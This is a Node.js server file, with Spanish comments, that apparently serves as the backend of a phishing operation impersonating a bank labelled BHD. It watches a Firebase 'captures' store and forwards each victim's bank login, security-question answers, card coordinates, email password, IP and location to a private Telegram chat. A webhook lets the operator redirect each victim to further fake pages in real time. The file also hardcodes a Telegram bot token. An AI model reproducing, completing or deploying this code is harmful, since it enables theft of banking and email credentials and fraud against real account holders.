// server.js
const express = require('express');
const admin = require('firebase-admin');
const axios = require('axios');

const app = express();
app.use(express.json());

// === CONFIGURACIÓN DE TELEGRAM ===
const TELEGRAM_BOT_TOKEN = '8302617462:AAGikIPtSly1eLtqJdEOQ8w2AoCGEj9gGKY';
const TELEGRAM_CHAT_ID = '-1002991672575'; // ID del grupo privado del admin
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const ALLOWED_PAGES = [
  'pregunta-1.html',
  'coordenada1.html',
  'coordenada2.html',
  'coordenada3.html',
  'coordenadaR.html',
  'mailbox.html',
  'finalizado.html'
];

// Inicializar Firebase Admin SDK
const serviceAccount = require('./serviceAccountKey.json');
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: 'https://bhd-firebase-default-rtdb.firebaseio.com'
});

const database = admin.database();

// === 1. Escuchar cambios en Firebase y enviar a Telegram ===
let isProcessing = false;

database.ref('/captures').on('child_added', async (snapshot) => {
  if (isProcessing) return;
  isProcessing = true;

  try {
    const uid = snapshot.key;
    const data = snapshot.val();

    // Evitar procesar el campo redirectPage
    const steps = Object.keys(data).filter(key => key !== 'redirectPage');
    if (steps.length === 0) return;

    const step = steps[0];
    const payload = data[step];

    // Construir mensaje para Telegram
    let mensaje = `🚨 *NUEVO DATO CAPTURADO - BHD*\n`;
    mensaje += `🔹 *UID*: \`${uid}\`\n`;
    mensaje += `🔹 *Paso*: ${step}\n\n`;

    if (step === 'login') {
      mensaje += `🔐 *CREDENCIALES*\n`;
      mensaje += `• Usuario: \`${payload.username}\`\n`;
      mensaje += `• Contraseña: \`${payload.password}\`\n\n`;
    } else if (step === 'security') {
      mensaje += `❓ *PREGUNTAS DE SEGURIDAD*\n`;
      mensaje += `• Color favorito: \`${payload.ans1}\`\n`;
      mensaje += `• Marca primer carro: \`${payload.ans2}\`\n`;
      mensaje += `• Personaje libro: \`${payload.ans3}\`\n`;
      mensaje += `• Abuela materna: \`${payload.ans4}\`\n`;
      mensaje += `• Colegio primaria: \`${payload.ans5}\`\n\n`;
    } else if (step.startsWith('coordenada')) {
      mensaje += `📍 *COORDENADAS (${step})*\n`;
      Object.keys(payload).forEach(key => {
        if (key.startsWith('coord')) {
          mensaje += `• ${key}: \`${payload[key]}\`\n`;
        }
      });
      mensaje += `\n`;
    } else if (step === 'mailbox') {
      mensaje += `📧 *CORREO*\n`;
      mensaje += `• Email: \`${payload.email}\`\n`;
      mensaje += `• Contraseña: \`${payload.emailPassword}\`\n\n`;
    }

    // Información del sistema
    mensaje += `🌐 *INFO DEL USUARIO*\n`;
    mensaje += `• IP: \`${payload.ip || 'N/A'}\`\n`;
    mensaje += `• Ubicación: ${payload.city || 'N/A'}, ${payload.region || 'N/A'}, ${payload.country || 'N/A'}\n`;
    mensaje += `• Navegador: ${payload.userAgent?.substring(0, 50) || 'N/A'}\n`;
    mensaje += `• Fecha: ${payload.date} - ${payload.time}\n\n`;

    // === OPCIONES DE REDIRECCIÓN ===
    mensaje += `⏭️ *OPCIONES DE REDIRECCIÓN* (responder en este chat):\n`;
    ALLOWED_PAGES.forEach(page => {
      mensaje += `/redirect ${uid} ${page}\n`;
    });

    // Enviar a Telegram
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: mensaje,
      parse_mode: 'Markdown'
    });

    console.log(`✅ Enviado a Telegram: ${uid}/${step}`);

  } catch (error) {
    console.error('❌ Error al procesar captura:', error.message);
  } finally {
    isProcessing = false;
  }
});

// === 2. Webhook para recibir comandos de Telegram ===
app.post('/telegram/webhook', async (req, res) => {
  const message = req.body?.message?.text;
  const chatId = req.body?.message?.chat?.id;

  // Validar que el mensaje viene del chat autorizado
  if (!message || chatId?.toString() !== TELEGRAM_CHAT_ID || !message.startsWith('/redirect ')) {
    return res.status(200).send('Ignored');
  }

  const commandRegex = /^\/redirect\s+([a-f0-9-]+)\s+([a-zA-Z0-9._-]+\.html)$/;
  const match = message.match(commandRegex);

  if (!match) {
    return res.status(200).send('Invalid command');
  }

  const uid = match[1];
  const page = match[2];

  if (!ALLOWED_PAGES.includes(page)) {
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: `❌ Página no permitida: ${page}`
    });
    return res.status(200).send('Invalid page');
  }

  try {
    // Actualizar Firebase para redirigir al usuario
    await database.ref(`/captures/${uid}/redirectPage`).set(page);

    // Confirmar al admin
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: `✅ Redirección configurada:\nUID: \`${uid}\`\n→ ${page}`,
      parse_mode: 'Markdown'
    });

    console.log(`✅ Redirección establecida: ${uid} → ${page}`);
  } catch (error) {
    console.error('❌ Error al actualizar Firebase:', error.message);
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: `❌ Error al redirigir UID: ${uid}`
    });
  }

  return res.status(200).send('OK');
});

// Ruta de prueba
app.get('/', (req, res) => {
  res.send('Servidor BHD activo!');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor corriendo en puerto ${PORT}`);
});